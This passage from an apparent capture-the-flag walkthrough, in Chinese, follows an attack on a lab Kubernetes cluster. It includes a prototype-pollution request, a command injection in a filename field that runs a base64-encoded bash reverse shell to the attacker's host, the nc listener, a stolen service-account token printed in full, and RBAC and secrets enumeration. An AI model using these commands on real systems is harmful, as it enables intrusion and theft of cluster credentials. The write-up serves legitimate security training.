<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">└─$ curl --cacert ca.crt  --header &quot;Authorization: Bearer $(cat token_admin)&quot; -s -k https://10.10.10.235:8443/api/v1/namespaces/dev/pods  -sk|jq|grep containerPort</span><br><span class="line">                      &quot;k:&#123;\&quot;containerPort\&quot;:3000,\&quot;protocol\&quot;:\&quot;TCP\&quot;&#125;&quot;: &#123;</span><br><span class="line">                        &quot;f:containerPort&quot;: &#123;&#125;,</span><br><span class="line">                &quot;containerPort&quot;: 3000,</span><br><span class="line">                      &quot;k:&#123;\&quot;containerPort\&quot;:3000,\&quot;protocol\&quot;:\&quot;TCP\&quot;&#125;&quot;: &#123;</span><br><span class="line">                        &quot;f:containerPort&quot;: &#123;&#125;,</span><br><span class="line">                &quot;containerPort&quot;: 3000,</span><br><span class="line">                      &quot;k:&#123;\&quot;containerPort\&quot;:3000,\&quot;protocol\&quot;:\&quot;TCP\&quot;&#125;&quot;: &#123;</span><br><span class="line">                        &quot;f:containerPort&quot;: &#123;&#125;,</span><br><span class="line">                &quot;containerPort&quot;: 3000,</span><br></pre></td></tr></table></figure>

<p>尝试从<code>default</code>的容器中访问这三台的3000口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># curl 10.42.0.63:3000 -skv</span><br><span class="line">* Expire in 0 ms for 6 (transfer 0x55d152f160f0)</span><br><span class="line">*   Trying 10.42.0.63...</span><br><span class="line">* TCP_NODELAY set</span><br><span class="line">* Expire in 200 ms for 4 (transfer 0x55d152f160f0)</span><br><span class="line">* Connected to 10.42.0.63 (10.42.0.63) port 3000 (#0)</span><br><span class="line">&gt; GET / HTTP/1.1</span><br><span class="line">&gt; Host: 10.42.0.63:3000</span><br><span class="line">&gt; User-Agent: curl/7.64.0</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; </span><br><span class="line">&lt; HTTP/1.1 200 OK</span><br><span class="line">&lt; X-Powered-By: Express</span><br><span class="line">&lt; Content-Type: application/json; charset=utf-8</span><br><span class="line">&lt; Content-Length: 2</span><br><span class="line">&lt; ETag: W/&quot;2-l9Fw4VUO7kr8CvBlt4zaMCqXZ0w&quot;</span><br><span class="line">&lt; Date: Mon, 09 Dec 2024 07:39:54 GMT</span><br><span class="line">&lt; Connection: keep-alive</span><br><span class="line">&lt; Keep-Alive: timeout=5</span><br><span class="line">&lt; </span><br><span class="line">&#123; [2 bytes data]</span><br><span class="line">* Connection #0 to host 10.42.0.63 left intact</span><br><span class="line">[]</span><br></pre></td></tr></table></figure>

<p>看着header和最初暴露的31337挺像的</p>
<p>用31337的<code>todo.txt</code>访问测试一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># curl -XPOST &#x27;10.42.0.63:3000/todo&#x27; -H &#x27;Content-Type: application/json&#x27; -d &#x27;&#123;&quot;auth&quot;: &#123;&quot;name&quot;: &quot;felamos&quot;, &quot;password&quot;: &quot;Winter2021&quot;&#125;, &quot;filename&quot; :&quot;todo.txt&quot;&#125;&#x27; -sk </span><br><span class="line">&#123;&quot;ok&quot;:true,&quot;content&quot;:&quot;1. Create administrator zone.\n2. Update node JS API Server.\n3. Add Login functionality.\n4. Complete Get Messages feature.\n5. Complete ToDo feature.\n6. Implement Google Cloud Storage function: https://cloud.google.com/storage/docs/json_api/v1\n7. Improve security\n&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>没错，就是同样的服务，那也就用同样的方式再拿一遍dev的pod内容器的shell就好</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">root@webapp-deployment-9546bc7cb-zjnnh:/run/secrets/kubernetes.io/serviceaccount# curl -XPUT &#x27;http://10.42.0.70:3000&#x27; -H &#x27;Content-Type: application/json&#x27; -d &#x27;&#123;&quot;auth&quot;: &#123;&quot;name&quot;: &quot;felamos&quot;, &quot;password&quot;: &quot;Winter2021&quot;&#125;, &quot;message&quot; :&#123;&quot;prototype&quot;: &#123;&quot;canUpload&quot;: true&#125;&#125;&#125;&#x27;</span><br><span class="line">* Expire in 0 ms for 6 (transfer 0x55bc69a890f0)</span><br><span class="line">*   Trying 10.42.0.64...</span><br><span class="line">* TCP_NODELAY set</span><br><span class="line">* Expire in 200 ms for 4 (transfer 0x55bc69a890f0)</span><br><span class="line">* Connected to 10.42.0.64 (10.42.0.64) port 3000 (#0)</span><br><span class="line">&gt; PUT / HTTP/1.1</span><br><span class="line">&gt; Host: 10.42.0.64:3000</span><br><span class="line">&gt; User-Agent: curl/7.64.0</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; Content-Type: application/json</span><br><span class="line">&gt; Content-Length: 102</span><br><span class="line">&gt; </span><br><span class="line">* upload completely sent off: 102 out of 102 bytes</span><br><span class="line">&lt; HTTP/1.1 200 OK</span><br><span class="line">&lt; X-Powered-By: Express</span><br><span class="line">&lt; Content-Type: application/json; charset=utf-8</span><br><span class="line">&lt; Content-Length: 11</span><br><span class="line">&lt; ETag: W/&quot;b-Ai2R8hgEarLmHKwesT1qcY913ys&quot;</span><br><span class="line">&lt; Date: Thu, 05 Dec 2024 07:52:12 GMT</span><br><span class="line">&lt; Connection: keep-alive</span><br><span class="line">&lt; Keep-Alive: timeout=5</span><br><span class="line">&lt; </span><br><span class="line">* Connection #0 to host 10.42.0.64 left intact</span><br><span class="line">&#123;&quot;ok&quot;:true&#125;</span><br></pre></td></tr></table></figure>

<p>merge污染完再拿一下shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -XPOST <span class="string">&#x27;http://10.42.0.70:3000/upload&#x27;</span> -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> -d <span class="string">&#x27;&#123;&quot;auth&quot;: &#123;&quot;name&quot;: &quot;felamos&quot;, &quot;password&quot;: &quot;Winter2021&quot;&#125;, &quot;filename&quot; :&quot;a | echo L2Jpbi9iYXNoID4mIC9kZXYvdGNwLzEwLjEwLjE2LjkvMTAwODcgMD4mMQ==|base64 -d|bash &quot;&#125;&#x27;</span> -skv</span><br></pre></td></tr></table></figure>

<p>再一次拿到pod内的serviceaccount</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">└─$ nc -lvnp 10087                                                                                           </span><br><span class="line">listening on [any] 10087 ...</span><br><span class="line">connect to [10.10.16.9] from (UNKNOWN) [10.10.10.235] 56444</span><br><span class="line">ls</span><br><span class="line">index.js</span><br><span class="line">node_modules</span><br><span class="line">package-lock.json</span><br><span class="line">package.json</span><br><span class="line">todo.txt</span><br><span class="line">cd /run/*/*</span><br><span class="line">ls</span><br><span class="line">serviceaccount</span><br><span class="line">cd s*</span><br><span class="line">ls</span><br><span class="line">ca.crt</span><br><span class="line">namespace</span><br><span class="line">token</span><br><span class="line">cat token</span><br><span class="line">eyJhbGciOiJSUzI1NiIsImtpZCI6InRqSFZ0OThnZENVcDh4SXltTGhfU0hEX3A2UXBhMG03X2pxUVYtMHlrY2cifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiLCJrM3MiXSwiZXhwIjoxNzY0OTIzMTIwLCJpYXQiOjE3MzMzODcxMjAsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZXYiLCJwb2QiOnsibmFtZSI6ImRldm5vZGUtZGVwbG95bWVudC03NzZkYmNmN2Q2LWc0NjU5IiwidWlkIjoiMWEzZjIyZGMtNTJlYS00MmYwLWEyMjMtOWFlZmU2YWJmYmVmIn0sInNlcnZpY2VhY2NvdW50Ijp7Im5hbWUiOiJkZWZhdWx0IiwidWlkIjoiMjk1NzViZmMtMTlkYi00MTBkLWJmZmYtZWQ1OGVjMWY0NzUzIn0sIndhcm5hZnRlciI6MTczMzM5MDcyN30sIm5iZiI6MTczMzM4NzEyMCwic3ViIjoic3lzdGVtOnNlcnZpY2VhY2NvdW50OmRldjpkZWZhdWx0In0.i2VtihjCVcByIoithsGw1TIjvD_7T7Mpnkgym0-jv6HWsov8cg2_PA15TWNlB7rKLKsEmvxzGFDCQBLrKf2svMQj1Y636I0vGLsyrkD8g2X-oqWIuDwtrnFRm0TfCki6jhJZ5bSQNR2jKFBlT_EvRQ81eZFsO4gNmU5Xt4eMPAmPv-Yfl755WeZ6HVYqByNT6iBP1rtNca7hEYVe4D_hv6M2G3SBaFoVDeC40-8uOyysXyj-KC_gRPmLASjHMG4QgkX60aNM3Fb-EwaU_cOKbKB2XSunLjbNtpxDucu59Fn5b8NmndLJ5ZSeb3xBPm37cRHyfNcrx0Lx-aumSfKh4Q</span><br></pre></td></tr></table></figure>

<p>拿着新的token看下权限</p>
<h3 id="dev-1"><a href="#dev-1" class="headerlink" title="dev"></a>dev</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">└─$ curl --cacert ca.crt  --header &quot;Authorization: Bearer $(cat token_dev )&quot; -i -s -k -X $&#x27;POST&#x27; \</span><br><span class="line">    -H $&#x27;Content-Type: application/json&#x27; \</span><br><span class="line">    --data-binary $&#x27;&#123;\&quot;kind\&quot;:\&quot;SelfSubjectRulesReview\&quot;,\&quot;apiVersion\&quot;:\&quot;authorization.k8s.io/v1\&quot;,\&quot;metadata\&quot;:&#123;\&quot;creationTimestamp\&quot;:null&#125;,\&quot;spec\&quot;:&#123;\&quot;namespace\&quot;:\&quot;dev\&quot;&#125;,\&quot;status\&quot;:&#123;\&quot;resourceRules\&quot;:null,\&quot;nonResourceRules\&quot;:null,\&quot;incomplete\&quot;:false&#125;&#125;\x0a&#x27; \</span><br><span class="line">    &quot;https://10.10.10.235:8443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews&quot;</span><br><span class="line">HTTP/1.1 200 Connection established</span><br><span class="line"></span><br><span class="line">HTTP/2 201</span><br><span class="line">audit-id: e82e1a07-2bff-4b19-bfe1-db90a4480d69</span><br><span class="line">cache-control: no-cache, private</span><br><span class="line">content-type: application/json</span><br><span class="line">x-kubernetes-pf-flowschema-uid: efae0180-b029-4131-8587-9a1edc0329ea</span><br><span class="line">x-kubernetes-pf-prioritylevel-uid: ba18e810-22c2-42c9-bc2b-7daf773f1d58</span><br><span class="line">date: Thu, 05 Dec 2024 08:44:40 GMT</span><br><span class="line">content-length: 1217</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;kind&quot;: &quot;SelfSubjectRulesReview&quot;,</span><br><span class="line">  &quot;apiVersion&quot;: &quot;authorization.k8s.io/v1&quot;,</span><br><span class="line">  &quot;metadata&quot;: &#123;</span><br><span class="line">    &quot;creationTimestamp&quot;: null</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;spec&quot;: &#123;</span><br><span class="line"></span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;status&quot;: &#123;</span><br><span class="line">    &quot;resourceRules&quot;: [</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;verbs&quot;: [</span><br><span class="line">          &quot;create&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;apiGroups&quot;: [</span><br><span class="line">          &quot;authorization.k8s.io&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;resources&quot;: [</span><br><span class="line">          &quot;selfsubjectaccessreviews&quot;,</span><br><span class="line">          &quot;selfsubjectrulesreviews&quot;</span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    ],</span><br><span class="line">    &quot;nonResourceRules&quot;: [</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;verbs&quot;: [</span><br><span class="line">          &quot;get&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;nonResourceURLs&quot;: [</span><br><span class="line">          &quot;/healthz&quot;,</span><br><span class="line">          &quot;/livez&quot;,</span><br><span class="line">          &quot;/readyz&quot;,</span><br><span class="line">          &quot;/version&quot;,</span><br><span class="line">          &quot;/version/&quot;</span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;verbs&quot;: [</span><br><span class="line">          &quot;get&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;nonResourceURLs&quot;: [</span><br><span class="line">          &quot;/api&quot;,</span><br><span class="line">          &quot;/api/*&quot;,</span><br><span class="line">          &quot;/apis&quot;,</span><br><span class="line">          &quot;/apis/*&quot;,</span><br><span class="line">          &quot;/healthz&quot;,</span><br><span class="line">          &quot;/livez&quot;,</span><br><span class="line">          &quot;/openapi&quot;,</span><br><span class="line">          &quot;/openapi/*&quot;,</span><br><span class="line">          &quot;/readyz&quot;,</span><br><span class="line">          &quot;/version&quot;,</span><br><span class="line">          &quot;/version/&quot;</span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;verbs&quot;: [</span><br><span class="line">          &quot;get&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;nonResourceURLs&quot;: [</span><br><span class="line">          &quot;/.well-known/openid-configuration&quot;,</span><br><span class="line">          &quot;/openid/v1/jwks&quot;</span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    ],</span><br><span class="line">    &quot;incomplete&quot;: false</span><br><span class="line">  &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>这个token的dev空间权限和之前没什么差异</p>
<h3 id="kube-system"><a href="#kube-system" class="headerlink" title="kube-system"></a>kube-system</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">└─$ curl --cacert ca.crt  --header &quot;Authorization: Bearer $(cat token_dev )&quot; -i -s -k -X $&#x27;POST&#x27; \</span><br><span class="line">    -H $&#x27;Content-Type: application/json&#x27; \</span><br><span class="line">    --data-binary $&#x27;&#123;\&quot;kind\&quot;:\&quot;SelfSubjectRulesReview\&quot;,\&quot;apiVersion\&quot;:\&quot;authorization.k8s.io/v1\&quot;,\&quot;metadata\&quot;:&#123;\&quot;creationTimestamp\&quot;:null&#125;,\&quot;spec\&quot;:&#123;\&quot;namespace\&quot;:\&quot;kube-system\&quot;&#125;,\&quot;status\&quot;:&#123;\&quot;resourceRules\&quot;:null,\&quot;nonResourceRules\&quot;:null,\&quot;incomplete\&quot;:false&#125;&#125;\x0a&#x27; \</span><br><span class="line">    &quot;https://10.10.10.235:8443/apis/authorization.k8s.io/v1/selfsubjectrulesreviews&quot;</span><br><span class="line">HTTP/1.1 200 Connection established</span><br><span class="line"></span><br><span class="line">HTTP/2 201</span><br><span class="line">audit-id: 6f7bc2fa-333a-457b-b25c-f895196418c5</span><br><span class="line">cache-control: no-cache, private</span><br><span class="line">content-type: application/json</span><br><span class="line">x-kubernetes-pf-flowschema-uid: efae0180-b029-4131-8587-9a1edc0329ea</span><br><span class="line">x-kubernetes-pf-prioritylevel-uid: ba18e810-22c2-42c9-bc2b-7daf773f1d58</span><br><span class="line">date: Fri, 06 Dec 2024 09:18:27 GMT</span><br><span class="line">content-length: 1398</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;kind&quot;: &quot;SelfSubjectRulesReview&quot;,</span><br><span class="line">  &quot;apiVersion&quot;: &quot;authorization.k8s.io/v1&quot;,</span><br><span class="line">  &quot;metadata&quot;: &#123;</span><br><span class="line">    &quot;creationTimestamp&quot;: null</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;spec&quot;: &#123;</span><br><span class="line"></span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;status&quot;: &#123;</span><br><span class="line">    &quot;resourceRules&quot;: [</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;verbs&quot;: [</span><br><span class="line">          &quot;create&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;apiGroups&quot;: [</span><br><span class="line">          &quot;authorization.k8s.io&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;resources&quot;: [</span><br><span class="line">          &quot;selfsubjectaccessreviews&quot;,</span><br><span class="line">          &quot;selfsubjectrulesreviews&quot;</span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;verbs&quot;: [</span><br><span class="line">          &quot;get&quot;,</span><br><span class="line">          &quot;list&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;apiGroups&quot;: [</span><br><span class="line">          &quot;&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;resources&quot;: [</span><br><span class="line">          &quot;secrets&quot;</span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    ],</span><br><span class="line">    &quot;nonResourceRules&quot;: [</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;verbs&quot;: [</span><br><span class="line">          &quot;get&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;nonResourceURLs&quot;: [</span><br><span class="line">          &quot;/.well-known/openid-configuration&quot;,</span><br><span class="line">          &quot;/openid/v1/jwks&quot;</span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;verbs&quot;: [</span><br><span class="line">          &quot;get&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;nonResourceURLs&quot;: [</span><br><span class="line">          &quot;/healthz&quot;,</span><br><span class="line">          &quot;/livez&quot;,</span><br><span class="line">          &quot;/readyz&quot;,</span><br><span class="line">          &quot;/version&quot;,</span><br><span class="line">          &quot;/version/&quot;</span><br><span class="line">        ]</span><br><span class="line">      &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;verbs&quot;: [</span><br><span class="line">          &quot;get&quot;</span><br><span class="line">        ],</span><br><span class="line">        &quot;nonResourceURLs&quot;: [</span><br><span class="line">          &quot;/api&quot;,</span><br><span class="line">          &quot;/api/*&quot;,</span><br><span class="line">          &quot;/apis&quot;,</span><br><span class="line">          &quot;/apis/*&quot;,</span><br><span class="line">          &quot;/healthz&quot;,</span><br><span class="line">          &quot;/livez&quot;,</span><br><span class="line">          &quot;/openapi&quot;,</span><br><span class="line">          &quot;/openapi/*&quot;,</span><br><span class="line">          &quot;/readyz&quot;,</span><br><span class="line">          &quot;/version&quot;,</span><br><span class="line">          &quot;/version/&quot;</span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    ],</span><br><span class="line">    &quot;incomplete&quot;: false</span><br><span class="line">  &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>反而是对于<code>kube-system</code>有了查看secrets的权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&quot;verbs&quot;: [</span><br><span class="line">  &quot;get&quot;,</span><br><span class="line">  &quot;list&quot;</span><br><span class="line">],</span><br><span class="line">&quot;apiGroups&quot;: [</span><br><span class="line">  &quot;&quot;</span><br><span class="line">],</span><br><span class="line">&quot;resources&quot;: [</span><br><span class="line">  &quot;secrets&quot;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>查看一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">└─$ k get secrets --all-namespaces</span><br><span class="line">NAMESPACE         NAME                                                 TYPE                                  DATA   AGE</span><br><span class="line">kube-system       unobtainium.node-password.k3s                        Opaque                                1      2y102d</span><br><span class="line">kube-system       horizontal-pod-autoscaler-token-2fg27                kubernetes.io/service-account-token   3      2y102d</span><br><span class="line">kube-system       coredns-token-jx62b                                  kubernetes.io/service-account-token   3      2y102d</span><br><span class="line">kube-system       local-path-provisioner-service-account-token-2tk2q   kubernetes.io/service-account-token   3      2y102d</span><br><span class="line">kube-system       statefulset-controller-token-b25sg                   kubernetes.io/service-account-token   3      2y102d</span><br><span class="line">kube-system       certificate-controller-token-98jdq                   kubernetes.io/service-account-token   3      2y102d</span><br><span class="line">kube-system       root-ca-cert-publisher-token-t564t                   kubernetes.io/service-account-token   3      2y102d</span><br><span class="line">kube-system       ephemeral-volume-controller-token-brb5h              kubernetes.io/service-account-token   3      2y102d</span><br><span class="line">kube-system       ttl-after-finished-controller-token-wf8k9            kubernetes.io/service-account-token   3      2y102d</span><br><span class="line">kube-system       replication-controller-token-9m8mh                   kubernetes.io/service-account-token   3      2y102d</span><br><span class="line">kube-system       service-account-controller-token-6vsl2               kubernetes.io/service-account-token   3      2y102d</span><br><span class="line">kube-system       node-controller-token-dfztj                          kubernetes.io/service-account-token   3      2y102d</span><br><span class="line">kube-system       metrics-server-token-d4k84                           kubernetes.io/service-account-token   3      2y102d</span><br><span class="line">kube-system       pvc-protection-controller-token-btkqg                kubernetes.io/service-account-token   3      2y102d</span><br><span class="line">kube-system       pv-protection-controller-token-k8gq8                 kubernetes.io/service-account-token   3      2y102d</span><br><span class="line">kube-system       endpoint-controller-token-zd5b9                      kubernetes.io/service-account-token   3      2y102d</span><br><span class="line">kube-system       disruption-controller-token-cnqj8                    kubernetes.io/service-account-token   3      2y102d</span><br><span class="line">kube-system       cronjob-controller-token-csxvj                       kubernetes.io/service-account-token   3      2y102d</span><br><span class="line">kube-system       endpointslice-controller-token-wrnvm                 kubernetes.io/service-account-token   3      2y102d</span><br><span class="line">kube-system       pod-garbage-collector-token-56dzk                    kubernetes.io/service-account-token   3      2y102d</span><br><span class="line">kube-system       namespace-controller-token-g8jmq                     kubernetes.io/service-account-token   3      2y102d</span><br><span class="line">kube-system       daemon-set-controller-token-b68xx                    kubernetes.io/service-account-token   3      2y102d</span><br><span class="line">kube-system       replicaset-controller-token-7fkxv                    kubernetes.io/service-account-token   3      2y102d</span><br><span class="line">kube-system       job-controller-token-xctqc                           kubernetes.io/service-account-token   3      2y102d</span><br><span class="line">kube-system       ttl-controller-token-rsshv                           kubernetes.io/service-account-token   3      2y102d</span><br><span class="line">kube-system       deployment-controller-token-npk6k                    kubernetes.io/service-account-token   3      2y102d</span><br><span class="line">kube-system       attachdetach-controller-token-xvj9h                  kubernetes.io/service-account-token   3      2y102d</span><br><span class="line">kube-system       endpointslicemirroring-controller-token-b5r69        kubernetes.io/service-account-token   3      2y102d</span><br><span class="line">kube-system       resourcequota-controller-token-8pp4p                 kubernetes.io/service-account-token   3      2y102d</span><br><span class="line">kube-system       generic-garbage-collector-token-5nkzj                kubernetes.io/service-account-token   3      2y102d</span><br><span class="line">kube-system       persistent-volume-binder-token-865v2                 kubernetes.io/service-account-token   3      2y102d</span><br><span class="line">kube-system       expand-controller-token-f2csp                        kubernetes.io/service-account-token   3      2y102d</span><br><span class="line">kube-system       clusterrole-aggregation-controller-token-wp8k6       kubernetes.io/service-account-token   3      2y102d</span><br><span class="line">default           default-token-4pjb9                                  kubernetes.io/service-account-token   3      2y102d</span><br><span class="line">kube-system       default-token-h5tf2                                  